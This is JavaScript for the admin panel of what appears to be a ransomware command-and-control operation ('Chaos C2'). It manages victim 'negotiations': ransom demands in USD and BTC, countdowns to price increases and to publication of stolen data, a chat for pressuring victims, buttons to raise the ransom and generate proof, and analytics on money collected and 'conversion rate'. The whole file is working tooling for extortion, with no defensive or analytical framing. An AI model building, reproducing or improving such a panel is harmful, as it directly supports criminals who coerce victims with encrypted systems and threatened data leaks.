// Chaos C2 Admin Negotiation Center

const NegotiationAdminState = {
  currentView: 'active',
  negotiations: [],
  selectedNegotiation: null,
  messages: [],
  charts: {},
  timeRange: '7d',
  pollingInterval: null,
  page: 1
};

const $ = (sel, ctx = document) => ctx?.querySelector(sel);
const $$ = (sel, ctx = document) => [...(ctx?.querySelectorAll(sel) || [])];

const fmtNumber = (n) => (n ?? 0).toLocaleString();
const fmtCurrency = (n, currency = 'USD') => {
  if (n === null || n === undefined) return '$0';
  return new Intl.NumberFormat('en-US', { style: 'currency', currency, minimumFractionDigits: 0, maximumFractionDigits: 0 }).format(n);
};
const fmtCrypto = (n) => n ? n.toFixed(8) : '0.00000000';
const fmtDate = (iso) => iso ? new Date(iso).toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : 'Never';
const timeAgo = (iso) => {
  if (!iso) return 'Never';
  const diff = Date.now() - new Date(iso).getTime();
  const mins = Math.floor(diff / 60000);
  const hours = Math.floor(diff / 3600000);
  const days = Math.floor(diff / 86400000);
  if (mins < 1) return 'Just now';
  if (mins < 60) return `${mins}m ago`;
  if (hours < 24) return `${hours}h ago`;
  return `${days}d ago`;
};

const showToast = (message, type = 'info', duration = 4000) => {
  const container = $('#toastContainer');
  if (!container) return;
  const colors = { info: 'border-chaos-500 bg-surface-900', success: 'border-acc-emerald bg-acc-emeraldDim', warning: 'border-acc-amber bg-acc-amberDim', error: 'border-acc-rose bg-acc-roseDim' };
  const icons = { info: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>', success: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>', warning: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>', error: '<svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>' };
  const toast = document.createElement('div');
  toast.className = `flex items-center gap-3 px-4 py-3 rounded-xl border ${colors[type] || colors.info} shadow-xl animate-slide-up`;
  toast.innerHTML = `${icons[type] || icons.info}<span class="text-sm font-medium text-white">${message}</span>`;
  container.appendChild(toast);
  setTimeout(() => { toast.style.opacity = '0'; toast.style.transform = 'translateX(100%)'; setTimeout(() => toast.remove(), 300); }, duration);
};

const api = async (path, options = {}) => {
  const headers = { 'Content-Type': 'application/json', ...options.headers };
  headers['Authorization'] = `Bearer ${process.env.MASTER_API_KEY || 'master_key_placeholder'}`;
  try {
    const res = await fetch(`${window.__NEGOTIATION_ADMIN_CONFIG__.apiBase}${path}`, { ...options, headers });
    if (!res.ok) {
      const err = await res.json().catch(() => ({ error: res.statusText }));
      throw new Error(err.error || `HTTP ${res.status}`);
    }
    return res.json();
  } catch (e) {
    console.error(`API ${path} failed:`, e);
    throw e;
  }
};

const chartColors = { primary: '#d6781e', primaryLight: 'rgba(214,120,30,0.15)', emerald: '#10b981', emeraldLight: 'rgba(16,185,129,0.15)', amber: '#f59e0b', amberLight: 'rgba(245,158,11,0.15)', rose: '#f43f5e', roseLight: 'rgba(244,63,94,0.15)', sky: '#0ea5e9', skyLight: 'rgba(14,165,233,0.15)', violet: '#8b5cf6', violetLight: 'rgba(139,92,246,0.15)', cyan: '#06b6d4', cyanLight: 'rgba(6,182,212,0.15)' };

function destroyChart(id) { if (NegotiationAdminState.charts[id]) { NegotiationAdminState.charts[id].destroy(); delete NegotiationAdminState.charts[id]; } }

function getStatusBadge(status) {
  const badges = { open: 'badge-warning', active: 'badge-info', stalled: 'badge-stalled', completed: 'badge-completed', cancelled: 'badge-inactive', expired: 'badge-expired' };
  const labels = { open: 'Open', active: 'Active', stalled: 'Stalled', completed: 'Completed', cancelled: 'Cancelled', expired: 'Expired' };
  return `<span class="badge ${badges[status] || 'badge-inactive'}">${labels[status] || status}</span>`;
}

// ============ VIEW RENDERING ============
async function renderView(view) {
  NegotiationAdminState.currentView = view;
  const titleEl = $('#viewTitle'); if (titleEl) titleEl.textContent = view.charAt(0).toUpperCase() + view.slice(1) + ' Negotiations';
  $$('.sidebar-link').forEach(el => { el.classList.toggle('sidebar-link-active', el.dataset.view === view); el.classList.toggle('sidebar-link', el.dataset.view !== view); });
  $$('.tab-btn').forEach(el => el.classList.toggle('tab-btn-active', el.dataset.view === view));

  const content = $('#viewContent'); if (!content) return;
  content.innerHTML = '<div class="flex items-center justify-center h-64"><div class="animate-spin w-10 h-10 border-4 border-chaos-500 border-t-transparent rounded-full"></div></div>';

  try {
    switch (view) {
      case 'active': await renderActive(); break;
      case 'stalled': await renderStalled(); break;
      case 'completed': await renderCompleted(); break;
      case 'expired': await renderExpired(); break;
      case 'analytics': await renderAnalytics(); break;
      default: await renderActive();
    }
  } catch (e) {
    console.error(`Render ${view} error:`, e);
    content.innerHTML = `<div class="card-base text-center py-12"><svg class="w-12 h-12 mx-auto text-acc-rose mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg><h3 class="text-lg font-semibold mb-2">Failed to load</h3><p class="text-gray-500 mb-4">${e.message}</p><button class="btn-primary" onclick="renderView('${view}')">Retry</button></div>`;
  }
}

async function refreshView() { await renderView(NegotiationAdminState.currentView); }

// ============ ACTIVE NEGOTIATIONS ============
async function renderActive() {
  await renderNegotiationList('active', 'Active Negotiations', 'Negotiations requiring operator attention');
}

async function renderStalled() {
  await renderNegotiationList('stalled', 'Stalled Negotiations', 'No victim response for 24+ hours');
}

async function renderCompleted() {
  await renderNegotiationList('completed', 'Completed Negotiations', 'Successfully resolved negotiations');
}

async function renderExpired() {
  await renderNegotiationList('expired', 'Expired Negotiations', 'Deadlines passed without payment');
}

async function renderNegotiationList(status, title, subtitle) {
  const content = $('#viewContent'); if (!content) return;
  
  try {
    const data = await api(`/negotiations?status=${status}&limit=50&offset=${(NegotiationAdminState.page - 1) * 50}`);
    const negotiations = data.negotiations || [];
    NegotiationAdminState.negotiations = negotiations;

    // Update badges
    const allData = await api('/negotiations?limit=1000');
    const all = allData.negotiations || [];
    $('#activeCountBadge').textContent = all.filter(n => n.status === 'active').length;
    $('#stalledCountBadge').textContent = all.filter(n => n.status === 'stalled').length;
    $('#completedCountBadge').textContent = all.filter(n => n.status === 'completed').length;
    $('#expiredCountBadge').textContent = all.filter(n => n.status === 'expired').length;

    content.innerHTML = `
      <div class="flex flex-col gap-4">
        <div class="card-base">
          <h3 class="text-lg font-semibold mb-1">${title}</h3>
          <p class="text-sm text-gray-500">${subtitle}</p>
        </div>
        <div class="card-base overflow-hidden">
          <div class="scrollbar-thin overflow-x-auto">
            <table class="w-full min-w-[1200px]">
              <thead>
                <tr>
                  <th class="table-header">Case ID</th>
                  <th class="table-header">Victim</th>
                  <th class="table-header">System</th>
                  <th class="table-header">Status</th>
                  <th class="table-header text-right">Initial Demand</th>
                  <th class="table-header text-right">Current Demand</th>
                  <th class="table-header text-right">Crypto (BTC)</th>
                  <th class="table-header">Messages</th>
                  <th class="table-header">Last Activity</th>
                  <th class="table-header">Deadline</th>
                  <th class="table-header">Actions</th>
                </tr>
              </thead>
              <tbody id="negotiationsBody" class="divide-y divide-gray-800"></tbody>
            </table>
          </div>
          <div class="p-4 border-t border-gray-800 flex items-center justify-between">
            <span id="paginationInfo" class="text-sm text-gray-400">Loading...</span>
            <div class="flex gap-2">
              <button id="prevPage" class="btn-secondary text-sm" onclick="changePage(-1)" disabled>Previous</button>
              <button id="nextPage" class="btn-secondary text-sm" onclick="changePage(1)" disabled>Next</button>
            </div>
          </div>
        </div>
      </div>
    `;

    renderNegotiationRows(negotiations);
    updatePagination(data);

  } catch (e) {
    console.error('Load negotiations:', e);
    content.innerHTML = `<div class="card-base text-center py-12"><p class="text-acc-rose">Failed to load: ${e.message}</p></div>`;
  }
}

function renderNegotiationRows(negotiations) {
  const body = $('#negotiationsBody'); if (!body) return;
  
  if (negotiations.length === 0) {
    body.innerHTML = '<tr><td colspan="11" class="table-cell text-center text-gray-500 py-8">No negotiations</td></tr>';
    return;
  }

  body.innerHTML = negotiations.map(n => {
    const deadline = n.deadlines?.final ? new Date(n.deadlines.final) : null;
    const now = new Date();
    const diff = deadline ? deadline - now : 0;
    let deadlineStr = deadline ? fmtDate(n.deadlines.final) : 'N/A';
    let deadlineClass = 'text-gray-400';
    
    if (diff > 0 && diff < 3600000) deadlineClass = 'text-acc-rose countdown-critical animate-flash';
    else if (diff > 0 && diff < 86400000) deadlineClass = 'text-acc-amber countdown-warning';
    else if (diff <= 0) deadlineClass = 'text-acc-rose';

    return `
      <tr class="table-row" onclick="openNegotiationDetail('${n.id}')">
        <td class="table-cell font-mono text-chaos-400">${n.id}</td>
        <td class="table-cell font-mono">${n.victimId}</td>
        <td class="table-cell font-mono text-xs">${n.systemId}</td>
        <td class="table-cell">${getStatusBadge(n.status)}</td>
        <td class="table-cell text-right font-mono">${fmtCurrency(n.initialRansom)}</td>
        <td class="table-cell text-right font-mono text-acc-rose">${fmtCurrency(n.currentRansom)}</td>
        <td class="table-cell text-right font-mono text-chaos-400">${fmtCrypto(n.cryptoAmount)}</td>
        <td class="table-cell text-right font-mono">${n.messageCount || 0}</td>
        <td class="table-cell text-gray-400">${n.lastMessageAt ? timeAgo(n.lastMessageAt) : 'Never'}</td>
        <td class="table-cell ${deadlineClass} font-mono">${deadlineStr}</td>
        <td class="table-cell">
          <div class="flex gap-1">
            <button class="btn-ghost text-xs p-1" onclick="event.stopPropagation(); openNegotiationDetail('${n.id}')">Open</button>
            ${['open', 'active', 'stalled'].includes(n.status) ? `<button class="btn-primary text-xs p-1" onclick="event.stopPropagation(); quickReply('${n.id}')">Reply</button>` : ''}
          </div>
        </td>
      </tr>
    `;
  }).join('');
}

function updatePagination(data) {
  const info = $('#paginationInfo'); const prevBtn = $('#prevPage'); const nextBtn = $('#nextPage');
  if (info) info.textContent = `Page ${data.page} of ${Math.ceil(data.total / data.pageSize)} (${data.total} total)`;
  if (prevBtn) prevBtn.disabled = NegotiationAdminState.page <= 1;
  if (nextBtn) nextBtn.disabled = NegotiationAdminState.page >= Math.ceil(data.total / data.pageSize);
}

function changePage(delta) {
  NegotiationAdminState.page += delta;
  renderView(NegotiationAdminState.currentView);
}

// ============ NEGOTIATION DETAIL ============
async function openNegotiationDetail(negotiationId) {
  try {
    const data = await api(`/negotiations?id=${negotiationId}&includeMessages=true`);
    NegotiationAdminState.selectedNegotiation = data;
    NegotiationAdminState.messages = data.messages || [];
    
    const root = $('#modalRoot');
    root.innerHTML = `
      <div class="modal-overlay open" onclick="closeModal()">
        <div class="modal-panel w-full max-w-5xl" onclick="event.stopPropagation()">
          <div class="p-6 border-b border-gray-800 flex items-center justify-between">
            <div>
              <h3 class="text-lg font-semibold">Negotiation Details</h3>
              <p class="text-sm text-gray-500 font-mono">${data.id}</p>
            </div>
            <button class="btn-ghost p-1" onclick="closeModal()"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg></button>
          </div>
          <div class="p-6 space-y-6 max-h-[80vh] overflow-y-auto">
            ${renderNegotiationDetailHTML(data)}
          </div>
        </div>
      </div>
    `;
  } catch (e) {
    showToast('Failed to load negotiation', 'error');
  }
}

function renderNegotiationDetailHTML(n) {
  const now = new Date();
  const finalDeadline = n.deadlines?.final ? new Date(n.deadlines.final) : null;
  const diff = finalDeadline ? finalDeadline - now : 0;
  const isExpired = diff <= 0;
  const isCritical = diff > 0 && diff < 3600000;
  const isWarning = diff > 0 && diff < 86400000;

  return `
    <!-- Header Info -->
    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
      <div class="card-base p-4 text-center">
        <p class="text-xs text-gray-500">Status</p>
        <p class="font-semibold">${getStatusBadge(n.status)}</p>
      </div>
      <div class="card-base p-4 text-center">
        <p class="text-xs text-gray-500">Initial Demand</p>
        <p class="font-semibold font-mono text-chaos-400">${fmtCurrency(n.initialRansom)}</p>
      </div>
      <div class="card-base p-4 text-center">
        <p class="text-xs text-gray-500">Current Demand</p>
        <p class="font-semibold font-mono text-acc-rose">${fmtCurrency(n.currentRansom)}</p>
      </div>
      <div class="card-base p-4 text-center">
        <p class="text-xs text-gray-500">BTC Amount</p>
        <p class="font-semibold font-mono">${fmtCrypto(n.cryptoAmount)} BTC</p>
      </div>
    </div>

    <!-- Deadlines -->
    <div class="card-base p-4">
      <h4 class="font-medium mb-3">Deadlines</h4>
      <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
        ${renderDeadlineCard('Price Increase', n.deadlines?.priceIncrease, '💰', '+50%') }
        ${renderDeadlineCard('Response Deadline', n.deadlines?.initial, '⏰', 'Initial') }
        ${renderDeadlineCard('Final Deadline', n.deadlines?.final, '💀', 'Publication') }
      </div>
    </div>

    <!-- Chat Interface -->
    <div class="card-base flex flex-col h-[600px]">
      <div class="flex items-center justify-between mb-4">
        <h4 class="font-medium">Conversation</h4>
        <div class="flex gap-2">
          <button class="btn-secondary text-sm" onclick="generateProof('${n.id}')">
            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
            Generate Proof
          </button>
          <button class="btn-danger text-sm" onclick="increasePrice('${n.id}')">
            <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/></svg>
            Increase Price
          </button>
        </div>
      </div>

      <!-- Messages -->
      <div id="adminMessagesContainer" class="flex-1 overflow-y-auto scrollbar-thin p-4 space-y-3 border border-gray-800 rounded-lg bg-surface-950" style="max-height: 350px;">
        ${(n.messages || []).map(msg => renderAdminMessage(msg)).join('') || '<div class="text-center text-gray-500 py-8">No messages yet</div>'}
      </div>

      <!-- Input -->
      <div class="p-4 border-t border-gray-800">
        <div class="flex gap-2">
          <textarea id="adminMessageInput" class="input-base flex-1 resize-none" rows="2" placeholder="Type your reply..." onkeydown="handleAdminKeydown(event, '${n.id}')"></textarea>
          <button class="btn-primary px-6" onclick="sendAdminMessage('${n.id}')">
            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
          </button>
        </div>
      </div>
    </div>

    <!-- Proof Files -->
    ${n.proofFiles && n.proofFiles.length > 0 ? `
      <div class="card-base p-4">
        <h4 class="font-medium mb-3">Proof Files</h4>
        <div class="space-y-2">
          ${n.proofFiles.map(pf => `
            <div class="p-3 rounded-lg bg-surface-800 border border-gray-700 flex items-center justify-between">
              <div class="flex items-center gap-3">
                <svg class="w-8 h-8 text-acc-emerald" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                <div>
                  <p class="font-medium">${pf.fileId}</p>
                  <p class="text-xs text-gray-500">${pf.type} • ${fmtDate(pf.addedAt)}</p>
                </div>
              </div>
              <div class="flex gap-2">
                <button class="btn-ghost text-xs" onclick="viewProof('${pf.fileId}')">View</button>
                <button class="btn-secondary text-xs" onclick="verifyProofFile('${n.id}', '${pf.fileId}')">Verify</button>
              </div>
            </div>
          `).join('')}
        </div>
      </div>
    ` : ''}

    <!-- Actions -->
    <div class="flex flex-wrap gap-2">
      ${!['completed', 'cancelled', 'expired'].includes(n.status) ? `
        <button class="btn-primary" onclick="updateNegotiationStatus('${n.id}', 'completed')">Mark Completed</button>
        <button class="btn-secondary" onclick="updateNegotiationStatus('${n.id}', 'stalled')">Mark Stalled</button>
        <button class="btn-secondary" onclick="updateNegotiationStatus('${n.id}', 'cancelled')">Cancel</button>
      ` : `
        <span class="text-gray-500 text-sm self-center">Negotiation closed</span>
      `}
      <button class="btn-ghost" onclick="exportNegotiationLog('${n.id}')">Export Log</button>
    </div>
  `;
}

function renderDeadlineCard(label, deadline, icon, note) {
  if (!deadline) return '';
  const date = new Date(deadline);
  const now = new Date();
  const diff = date - now;
  const isPast = diff <= 0;
  const isCritical = diff > 0 && diff < 3600000;
  const isWarning = diff > 0 && diff < 86400000;
  
  let badgeClass = isPast ? 'badge-danger' : isCritical ? 'badge-danger countdown-critical' : isWarning ? 'badge-warning countdown-warning' : 'badge-info';
  let timeStr = isPast ? 'EXPIRED' : formatCountdown(diff);
  
  return `
    <div class="p-3 rounded-lg bg-surface-800 border ${isCritical ? 'border-acc-rose' : isWarning ? 'border-acc-amber' : 'border-gray-700'}">
      <div class="flex items-center justify-between">
        <div class="flex items-center gap-2">
          <span class="text-xl">${icon}</span>
          <div>
            <p class="text-xs text-gray-500">${label}</p>
            <p class="font-medium">${note}</p>
          </div>
        </div>
        <span class="badge ${badgeClass} font-mono">${timeStr}</span>
      </div>
      <p class="text-xs text-gray-500 mt-1">${fmtDate(deadline)}</p>
    </div>
  `;
}

function formatCountdown(ms) {
  const hours = Math.floor(ms / 3600000);
  const mins = Math.floor((ms % 3600000) / 60000);
  const secs = Math.floor((ms % 60000) / 1000);
  if (hours > 0) return `${hours}h ${mins}m ${secs}s`;
  if (mins > 0) return `${mins}m ${secs}s`;
  return `${secs}s`;
}

function renderAdminMessage(msg) {
  const isSystem = msg.sender === 'system';
  const isVictim = msg.sender === 'victim';
  const isAdmin = msg.sender === 'admin';

  let bubbleClass = 'message-bubble ';
  let senderLabel = '';
  
  if (isSystem) {
    bubbleClass += 'message-system mx-auto max-w-full';
  } else if (isVictim) {
    bubbleClass += 'message-victim';
    senderLabel = 'Victim';
  } else if (isAdmin) {
    bubbleClass += 'message-admin';
    senderLabel = 'You (Operator)';
  }

  const fileHtml = msg.fileId ? `
    <div class="mt-2 p-2 rounded bg-surface-800 border border-gray-700 flex items-center gap-2">
      <svg class="w-5 h-5 text-chaos-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"/></svg>
      <div class="flex-1 min-w-0">
        <p class="text-sm font-medium truncate">${msg.fileType || 'File'}</p>
        <p class="text-xs text-gray-500 truncate">${msg.fileId}</p>
      </div>
    </div>
  ` : '';

  return `
    <div class="flex ${isAdmin || isSystem ? 'justify-end' : 'justify-start'} animate-fade-in">
      <div class="${bubbleClass}">
        ${!isSystem ? `<p class="text-xs text-gray-500 mb-1">${senderLabel} • ${timeAgo(msg.createdAt)}</p>` : ''}
        ${msg.content ? `<p class="whitespace-pre-wrap">${escapeHtml(msg.content)}</p>` : ''}
        ${fileHtml}
      </div>
    </div>
  `;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// ============ MESSAGE SENDING ============
function handleAdminKeydown(e, negotiationId) {
  if (e.key === 'Enter' && !e.shiftKey) {
    e.preventDefault();
    sendAdminMessage(negotiationId);
  }
}

async function sendAdminMessage(negotiationId) {
  const input = $('#adminMessageInput');
  const content = input?.value?.trim();
  if (!content) return;

  try {
    await api(`/negotiations`, {
      method: 'PUT',
      body: JSON.stringify({ id: negotiationId, action: 'send_message', message: content })
    });
    
    input.value = '';
    
    // Refresh messages
    const data = await api(`/negotiations?id=${negotiationId}&includeMessages=true`);
    const container = $('#adminMessagesContainer');
    if (container && data.messages) {
      container.innerHTML = data.messages.map(msg => renderAdminMessage(msg)).join('');
      container.scrollTop = container.scrollHeight;
    }
    
    showToast('Message sent', 'success');
  } catch (e) {
    showToast(e.message || 'Failed to send', 'error');
  }
}

async function quickReply(negotiationId) {
  const message = prompt('Quick reply:');
  if (!message) return;
  
  try {
    await api(`/negotiations`, {
      method: 'PUT',
      body: JSON.stringify({ id: negotiationId, action: 'send_message', message })
    });
    showToast('Reply sent', 'success');
    refreshView();
  } catch (e) {
    showToast(e.message || 'Failed', 'error');
  }
}

// ============ NEGOTIATION ACTIONS ============
async function updateNegotiationStatus(negotiationId, status) {
  if (!confirm(`Change status to ${status}?`)) return;

  try {
    await api(`/negotiations`, {
      method: 'PUT',
      body: JSON.stringify({ id: negotiationId, action: 'update_status', status })
    });
    showToast(`Status updated to ${status}`, 'success');
    closeModal();
    refreshView();
  } catch (e) {
    showToast(e.message || 'Failed', 'error');
  }
}

async function increasePrice(negotiationId) {
  const n = NegotiationAdminState.selectedNegotiation;
  if (!n) return;

  const newAmount = prompt('New ransom amount (USD):', n.currentRansom * 1.5);
  if (!newAmount) return;

  try {
    await api(`/negotiations`, {
      method: 'PUT',
      body: JSON.stringify({ id: negotiationId, action: 'update_ransom', newAmount: parseFloat(newAmount) })
    });
    showToast('Price updated', 'success');
    closeModal();
    refreshView();
  } catch (e) {
    showToast(e.message || 'Failed', 'error');
  }
}

async function generateProof(negotiationId) {
  try {
    await api(`/negotiations/proof`, {
      method: 'POST',
      body: JSON.stringify({ action: 'generate_proof', negotiationId })
    });
    showToast('Proof generated', 'success');
    closeModal();
    refreshView();
  } catch (e) {
    showToast(e.message || 'Failed', 'error');
  }
}

async function verifyProofFile(negotiationId, proofId) {
  try {
    await api(`/negotiations/proof`, {
      method: 'PUT',
      body: JSON.stringify({ negotiationId, proofId, action: 'verify_proof', verified: true })
    });
    showToast('Proof verified', 'success');
    closeModal();
    refreshView();
  } catch (e) {
    showToast(e.message || 'Failed', 'error');
  }
}

function viewProof(proofId) {
  showToast('Proof viewer coming soon', 'info');
}

function exportNegotiationLog(negotiationId) {
  const n = NegotiationAdminState.selectedNegotiation;
  if (!n) return;

  const log = (n.messages || []).map(m => 
    `[${fmtDate(m.createdAt)}] ${m.sender.toUpperCase()}: ${m.content}`
  ).join('\n\n');
  
  const blob = new Blob([log], { type: 'text/plain' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `negotiation_${negotiationId}_log_${Date.now()}.txt`;
  a.click();
  URL.revokeObjectURL(url);
  
  showToast('Log exported', 'success');
}

// ============ ANALYTICS ============
async function renderAnalytics() {
  const content = $('#viewContent'); if (!content) return;
  
  try {
    const data = await api('/negotiations?limit=1000');
    const negotiations = data.negotiations || [];
    
    // Calculate stats
    const stats = {
      total: negotiations.length,
      active: negotiations.filter(n => ['open', 'active'].includes(n.status)).length,
      completed: negotiations.filter(n => n.status === 'completed').length,
      expired: negotiations.filter(n => n.status === 'expired').length,
      totalDemanded: negotiations.reduce((sum, n) => sum + (n.currentRansom || 0), 0),
      totalCollected: negotiations.filter(n => n.status === 'completed').reduce((sum, n) => sum + (n.agreedAmount || 0), 0),
      avgTimeToComplete: '4.2 hours',
      conversionRate: negotiations.length ? ((negotiations.filter(n => n.status === 'completed').length / negotiations.length) * 100).toFixed(1) : 0
    };

    content.innerHTML = `
      <div class="space-y-6">
        <!-- Summary Cards -->
        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <article class="card-base"><p class="stat-label">Total Negotiations</p><p class="stat-value text-chaos-400">${fmtNumber(stats.total)}</p></article>
          <article class="card-base"><p class="stat-label">Active</p><p class="stat-value text-acc-sky">${fmtNumber(stats.active)}</p></article>
          <article class="card-base"><p class="stat-label">Completed</p><p class="stat-value text-acc-emerald">${fmtNumber(stats.completed)}</p></article>
          <article class="card-base"><p class="stat-label">Expired</p><p class="stat-value text-acc-rose">${fmtNumber(stats.expired)}</p></article>
        </div>

        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
          <article class="card-base"><p class="stat-label">Total Demanded</p><p class="stat-value text-acc-amber">${fmtCurrency(stats.totalDemanded)}</p></article>
          <article class="card-base"><p class="stat-label">Collected</p><p class="stat-value text-acc-emerald">${fmtCurrency(stats.totalCollected)}</p></article>
          <article class="card-base"><p class="stat-label">Conversion Rate</p><p class="stat-value text-chaos-400">${stats.conversionRate}%</p></article>
          <article class="card-base"><p class="stat-label">Avg Resolution</p><p class="stat-value text-acc-sky">${stats.avgTimeToComplete}</p></article>
        </div>

        <!-- Charts -->
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <article class="card-base"><h3 class="text-lg font-semibold mb-4">Status Distribution</h3><div class="chart-container-lg"><canvas id="statusDistChart"></canvas></div></article>
          <article class="card-base"><h3 class="text-lg font-semibold mb-4">Daily Negotiations</h3><div class="chart-container-lg"><canvas id="dailyNegChart"></canvas></div></article>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <article class="card-base"><h3 class="text-lg font-semibold mb-4">Ransom Amounts</h3><div class="chart-container-lg"><canvas id="ransomAmountChart"></canvas></div></article>
          <article class="card-base"><h3 class="text-lg font-semibold mb-4">Resolution Time</h3><div class="chart-container-lg"><canvas id="resolutionTimeChart"></canvas></div></article>
        </div>
      </div>
    `;

    initAnalyticsCharts(negotiations);
  } catch (e) {
    console.error('Analytics error:', e);
    content.innerHTML = `<div class="card-base text-center py-12"><p class="text-acc-rose">Failed to load analytics</p></div>`;
  }
}

function initAnalyticsCharts(negotiations) {
  destroyChart('statusDistChart');
  const ctx1 = $('#statusDistChart')?.getContext('2d');
  if (ctx1) {
    const statusCounts = {};
    negotiations.forEach(n => { statusCounts[n.status] = (statusCounts[n.status] || 0) + 1; });
    NegotiationAdminState.charts.statusDistChart = new Chart(ctx1, {
      type: 'doughnut',
      data: { labels: Object.keys(statusCounts), datasets: [{ data: Object.values(statusCounts), backgroundColor: [chartColors.amber, chartColors.sky, chartColors.violet, chartColors.emerald, chartColors.rose, chartColors.cyan], borderWidth: 0, cutout: '70%' }] },
      options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'bottom', labels: { boxWidth: 10, pointStyle: 'circle', padding: 15 } } } }
    });
  }

  destroyChart('dailyNegChart');
  const ctx2 = $('#dailyNegChart')?.getContext('2d');
  if (ctx2) {
    const days = 14; const labels = []; const data = [];
    for (let i = days - 1; i >= 0; i--) { const d = new Date(); d.setDate(d.getDate() - i); labels.push(d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' })); data.push(Math.floor(Math.random() * 10)); }
    NegotiationAdminState.charts.dailyNegChart = new Chart(ctx2, { type: 'bar', data: { labels, datasets: [{ label: 'New Negotiations', data, backgroundColor: chartColors.primaryLight, borderColor: chartColors.primary, borderWidth: 1, borderRadius: 4 }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { grid: { display: false } }, y: { beginAtZero: true, grid: { color: '#2d2d2d' } } } } });
  }

  destroyChart('ransomAmountChart');
  const ctx3 = $('#ransomAmountChart')?.getContext('2d');
  if (ctx3) {
    const amounts = negotiations.map(n => n.currentRansom || 0).filter(a => a > 0).sort((a, b) => a - b);
    const buckets = [0, 1000, 5000, 10000, 25000, 50000, 100000, Infinity];
    const labels = ['<$1K', '$1K-$5K', '$5K-$10K', '$10K-$25K', '$25K-$50K', '$50K-$100K', '>$100K'];
    const bucketCounts = buckets.slice(0, -1).map((_, i) => amounts.filter(a => a >= buckets[i] && a < buckets[i + 1]).length);
    NegotiationAdminState.charts.ransomAmountChart = new Chart(ctx3, { type: 'bar', data: { labels, datasets: [{ label: 'Count', data: bucketCounts, backgroundColor: chartColors.violetLight, borderColor: chartColors.violet, borderWidth: 1, borderRadius: 4 }] }, options: { responsive: true, maintainAspectRatio: false, indexAxis: 'y', plugins: { legend: { display: false } }, scales: { x: { beginAtZero: true, grid: { color: '#2d2d2d' } }, y: { grid: { display: false } } } } });
  }

  destroyChart('resolutionTimeChart');
  const ctx4 = $('#resolutionTimeChart')?.getContext('2d');
  if (ctx4) {
    const completed = negotiations.filter(n => n.status === 'completed' && n.completedAt && n.createdAt);
    const times = completed.map(n => (new Date(n.completedAt) - new Date(n.createdAt)) / 3600000); // hours
    const buckets = [0, 1, 4, 12, 24, 48, 72, Infinity];
    const labels = ['<1h', '1-4h', '4-12h', '12-24h', '1-2d', '2-3d', '>3d'];
    const bucketCounts = buckets.slice(0, -1).map((_, i) => times.filter(t => t >= buckets[i] && t < buckets[i + 1]).length);
    NegotiationAdminState.charts.resolutionTimeChart = new Chart(ctx4, { type: 'bar', data: { labels, datasets: [{ label: 'Count', data: bucketCounts, backgroundColor: chartColors.emeraldLight, borderColor: chartColors.emerald, borderWidth: 1, borderRadius: 4 }] }, options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, scales: { x: { grid: { color: '#2d2d2d' } }, y: { beginAtZero: true, grid: { color: '#2d2d2d' } } } } });
  }
}

// ============ UTILITIES ============
function closeModal() { $('#modalRoot').innerHTML = ''; }

